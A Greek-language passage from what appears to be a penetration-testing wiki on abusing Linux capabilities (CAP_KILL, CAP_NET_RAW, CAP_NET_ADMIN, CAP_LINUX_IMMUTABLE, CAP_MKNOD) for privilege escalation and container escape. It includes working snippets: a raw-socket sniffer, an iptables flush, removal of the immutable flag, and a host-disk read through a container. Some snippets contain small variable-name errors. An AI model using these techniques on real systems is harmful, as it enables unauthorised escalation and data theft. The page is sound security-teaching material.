Το [**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει αρκετές ευαίσθητες λειτουργίες, όπως πρόσβαση στα `/dev/mem`, `/dev/kmem` ή `/proc/kcore`, τροποποίηση του `mmap_min_addr`, πρόσβαση στα system calls `ioperm(2)` και `iopl(2)`, καθώς και διάφορες disk commands. Το `FIBMAP ioctl(2)` ενεργοποιείται επίσης μέσω αυτού του capability, γεγονός που έχει προκαλέσει προβλήματα στο [παρελθόν](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html). Σύμφωνα με τη man page, αυτό επιτρέπει επίσης στον κάτοχο να `perform a range of device-specific operations on other devices`.

Αυτό μπορεί να φανεί χρήσιμο για **privilege escalation** και **Docker breakout.**

## CAP_KILL

**Αυτό σημαίνει ότι είναι δυνατή η εξόντωση οποιουδήποτε process.**

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary διαθέτει αυτό το capability. Αν μπορούσατε **επίσης να τροποποιήσετε κάποιο configuration αρχείο ενός service ή socket** (ή οποιοδήποτε configuration αρχείο σχετίζεται με ένα service), θα μπορούσατε να τοποθετήσετε ένα backdoor και, στη συνέχεια, να τερματίσετε το process που σχετίζεται με αυτό το service και να περιμένετε να εκτελεστεί το νέο configuration αρχείο μαζί με το backdoor σας.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Αν έχετε δυνατότητες kill και υπάρχει ένα **node program running as root** (ή ως διαφορετικός χρήστης), πιθανότατα θα μπορούσατε να του **send** το **signal SIGUSR1** και να το κάνετε να **open the node debugger**, στον οποίο μπορείτε να συνδεθείτε.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Αυτό σημαίνει ότι είναι δυνατή η ακρόαση σε οποιαδήποτε θύρα (ακόμη και σε προνομιούχες θύρες).** Δεν μπορείτε να κάνετε privilege escalation απευθείας με αυτήν τη δυνατότητα.

**Παράδειγμα με binary**

Αν το **`python`** διαθέτει αυτήν τη δυνατότητα, θα μπορεί να ακούει σε οποιαδήποτε θύρα και ακόμη και να συνδέεται από αυτήν σε οποιαδήποτε άλλη θύρα (ορισμένες υπηρεσίες απαιτούν συνδέσεις από θύρες με συγκεκριμένα privileges)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Η δυνατότητα [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει στις διεργασίες να **δημιουργούν RAW και PACKET sockets**, επιτρέποντάς τους να δημιουργούν και να στέλνουν αυθαίρετα network packets. Αυτό μπορεί να οδηγήσει σε κινδύνους ασφαλείας σε containerized environments, όπως packet spoofing, traffic injection και παράκαμψη των network access controls. Κακόβουλοι actors θα μπορούσαν να το εκμεταλλευτούν για να παρεμβαίνουν στο container routing ή να θέσουν σε κίνδυνο την ασφάλεια του host network, ιδιαίτερα χωρίς επαρκείς firewall protections. Επιπλέον, η **CAP_NET_RAW** είναι κρίσιμη για privileged containers, ώστε να υποστηρίζουν λειτουργίες όπως το ping μέσω RAW ICMP requests.

**Αυτό σημαίνει ότι είναι δυνατή η παρακολούθηση της κίνησης.** Δεν μπορείτε να κάνετε privilege escalation απευθείας με αυτήν τη δυνατότητα.

**Παράδειγμα με binary**

Αν το binary **`tcpdump`** διαθέτει αυτήν τη δυνατότητα, θα μπορείτε να το χρησιμοποιήσετε για να καταγράψετε network information.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Σημειώστε ότι, αν το **περιβάλλον** σας παρέχει αυτήν τη δυνατότητα, θα μπορούσατε επίσης να χρησιμοποιήσετε το **`tcpdump`** για sniffing της κίνησης.

**Παράδειγμα με το binary 2**

Το ακόλουθο παράδειγμα είναι κώδικας **`python2`** που μπορεί να είναι χρήσιμος για την intercept της κίνησης στη διεπαφή "**lo**" (**localhost**). Ο κώδικας προέρχεται από το lab "_The Basics: CAP-NET_BIND + NET_RAW_" στο [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

Η δυνατότητα [**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) παρέχει στον κάτοχο τη δυνατότητα να **τροποποιεί τις ρυθμίσεις δικτύου**, συμπεριλαμβανομένων των ρυθμίσεων firewall, των routing tables, των δικαιωμάτων socket και των ρυθμίσεων των network interfaces μέσα στα εκτεθειμένα network namespaces. Επιτρέπει επίσης την ενεργοποίηση του **promiscuous mode** στα network interfaces, επιτρέποντας το packet sniffing μεταξύ namespaces.

**Example with binary**

Ας υποθέσουμε ότι το **python binary** διαθέτει αυτές τις δυνατότητες.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Αυτό σημαίνει ότι είναι δυνατή η τροποποίηση των attributes του inode.** Δεν μπορείτε να κάνετε privilege escalation απευθείας με αυτήν την capability.

**Παράδειγμα με binary**

Αν βρείτε ότι ένα αρχείο είναι immutable και το python έχει αυτήν την capability, μπορείτε να **αφαιρέσετε το immutable attribute και να κάνετε το αρχείο τροποποιήσιμο:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Σημειώστε ότι συνήθως αυτό το immutable attribute ορίζεται και αφαιρείται με:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

Το [**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει την εκτέλεση του system call `chroot(2)`, το οποίο μπορεί δυνητικά να επιτρέψει την έξοδο από περιβάλλοντα `chroot(2)` μέσω γνωστών vulnerabilities:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

Το [**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) δεν επιτρέπει μόνο την εκτέλεση του system call `reboot(2)` για επανεκκινήσεις συστήματος, συμπεριλαμβανομένων συγκεκριμένων εντολών όπως η `LINUX_REBOOT_CMD_RESTART2`, προσαρμοσμένων για συγκεκριμένες hardware platforms, αλλά επιτρέπει επίσης τη χρήση των `kexec_load(2)` και, από το Linux 3.17 και μετά, του `kexec_file_load(2)` για τη φόρτωση νέων ή signed crash kernels αντίστοιχα.

## CAP_SYSLOG

Το [**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) διαχωρίστηκε από το ευρύτερο **CAP_SYS_ADMIN** στο Linux 2.6.37, παρέχοντας συγκεκριμένα τη δυνατότητα χρήσης του call `syslog(2)`. Αυτό το capability επιτρέπει την προβολή kernel addresses μέσω των `/proc` και παρόμοιων interfaces όταν η ρύθμιση `kptr_restrict` είναι 1, η οποία ελέγχει την έκθεση των kernel addresses. Από το Linux 2.6.39, η προεπιλεγμένη τιμή του `kptr_restrict` είναι 0, που σημαίνει ότι οι kernel addresses εκτίθενται, αν και πολλές distributions την ορίζουν σε 1 (απόκρυψη addresses εκτός από το uid 0) ή σε 2 (πάντα απόκρυψη addresses) για λόγους ασφάλειας.

Επιπλέον, το **CAP_SYSLOG** επιτρέπει την πρόσβαση στο output του `dmesg` όταν το `dmesg_restrict` είναι 1. Παρά αυτές τις αλλαγές, το **CAP_SYS_ADMIN** διατηρεί τη δυνατότητα εκτέλεσης operations του `syslog` λόγω ιστορικών προηγούμενων.

## CAP_MKNOD

Το [**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επεκτείνει τη λειτουργικότητα του system call `mknod` πέρα από τη δημιουργία regular files, FIFOs (named pipes) ή UNIX domain sockets. Επιτρέπει συγκεκριμένα τη δημιουργία special files, στα οποία περιλαμβάνονται:

- **S_IFCHR**: Character special files, δηλαδή devices όπως τα terminals.
- **S_IFBLK**: Block special files, δηλαδή devices όπως οι disks.

Αυτό το capability είναι απαραίτητο για processes που απαιτούν τη δυνατότητα δημιουργίας device files, διευκολύνοντας την άμεση αλληλεπίδραση με το hardware μέσω character ή block devices.

Είναι ένα default docker capability ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Αυτό το capability επιτρέπει privilege escalations (μέσω full disk read) στο host, υπό τις εξής προϋποθέσεις:

1. Να υπάρχει αρχική πρόσβαση στο host (Unprivileged).
2. Να υπάρχει αρχική πρόσβαση στο container (Privileged (EUID 0) και effective `CAP_MKNOD`).
3. Το host και το container πρέπει να μοιράζονται το ίδιο user namespace.

**Βήματα για τη δημιουργία και πρόσβαση σε Block Device μέσα σε Container:**

1. **Στο Host ως Standard User:**

- Προσδιορίστε το τρέχον user ID σας με `id`, π.χ. `uid=1000(standarduser)`.
- Εντοπίστε το target device, για παράδειγμα, το `/dev/sdb`.

2. **Μέσα στο Container ως `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Πίσω στο Host:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Αυτή η προσέγγιση επιτρέπει στον standard user να αποκτήσει πρόσβαση και ενδεχομένως να διαβάσει δεδομένα από το `/dev/sdb` μέσω του container, εκμεταλλευόμενος τα shared user namespaces και τα permissions που έχουν οριστεί στη συσκευή.

### CAP_SETPCAP

Το **CAP_SETPCAP** επιτρέπει σε ένα process να **τροποποιεί τα capability sets** ενός άλλου process, επιτρέποντας την προσθήκη ή αφαίρεση capabilities από τα effective, inheritable και permitted sets. Ωστόσο, ένα process μπορεί να τροποποιεί μόνο capabilities που διαθέτει στο δικό του permitted set, διασφαλίζοντας ότι δεν μπορεί να αυξήσει τα privileges ενός άλλου process πέρα από τα δικά του. Οι πρόσφατες ενημερώσεις του kernel έχουν αυστηροποιήσει αυτούς τους κανόνες, περιορίζοντας το `CAP_SETPCAP` ώστε να μπορεί μόνο να μειώνει τα capabilities μέσα στα permitted sets του ίδιου ή των descendants του, με στόχο τον περιορισμό των security risks. Η χρήση απαιτεί την ύπαρξη του `CAP_SETPCAP` στο effective set και των target capabilities στο permitted set, χρησιμοποιώντας το `capset()` για τις τροποποιήσεις. Αυτή είναι μια σύνοψη της βασικής λειτουργίας και των περιορισμών του `CAP_SETPCAP`, αναδεικνύοντας τον ρόλο του στη διαχείριση privileges και στη βελτίωση της ασφάλειας.

Το **`CAP_SETPCAP`** είναι ένα Linux capability που επιτρέπει σε ένα process να **τροποποιεί τα capability sets ενός άλλου process**. Παρέχει τη δυνατότητα προσθήκης ή αφαίρεσης capabilities από τα effective, inheritable και permitted capability sets άλλων processes. Ωστόσο, υπάρχουν ορισμένοι περιορισμοί στον τρόπο χρήσης αυτού του capability.

Ένα process με `CAP_SETPCAP` **μπορεί να παραχωρεί ή να αφαιρεί μόνο capabilities που βρίσκονται στο δικό του permitted capability set**. Με άλλα λόγια, ένα process δεν μπορεί να παραχωρήσει ένα capability σε άλλο process, αν δεν διαθέτει το ίδιο αυτό το capability. Αυτός ο περιορισμός αποτρέπει ένα process από το να αυξήσει τα privileges ενός άλλου process πέρα από το δικό του επίπεδο privileges.

Επιπλέον, σε πρόσφατες εκδόσεις του kernel, το capability `CAP_SETPCAP` έχει **περιοριστεί περαιτέρω**. Δεν επιτρέπει πλέον σε ένα process να τροποποιεί αυθαίρετα τα capability sets άλλων processes. Αντίθετα, **επιτρέπει μόνο σε ένα process να μειώνει τα capabilities στο δικό του permitted capability set ή στο permitted capability set των descendants του**. Αυτή η αλλαγή εισήχθη για να μειώσει τα πιθανά security risks που σχετίζονται με το capability.

Για την αποτελεσματική χρήση του `CAP_SETPCAP`, πρέπει να διαθέτετε το capability στο effective capability set σας και τα target capabilities στο permitted capability set σας. Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το system call `capset()` για να τροποποιήσετε τα capability sets άλλων processes.

Συνοπτικά, το `CAP_SETPCAP` επιτρέπει σε ένα process να τροποποιεί τα capability sets άλλων processes, αλλά δεν μπορεί να παραχωρήσει capabilities που δεν διαθέτει το ίδιο. Επιπλέον, λόγω security concerns, η λειτουργικότητά του έχει περιοριστεί σε πρόσφατες εκδόσεις του kernel, ώστε να επιτρέπει μόνο τη μείωση capabilities στο δικό του permitted capability set ή στα permitted capability sets των descendants του.

## Αναφορές

**Τα περισσότερα από αυτά τα παραδείγματα προέρχονται από ορισμένα labs του** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), επομένως, αν θέλετε να εξασκηθείτε σε αυτές τις privesc techniques, προτείνω αυτά τα labs.

**Άλλες αναφορές**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
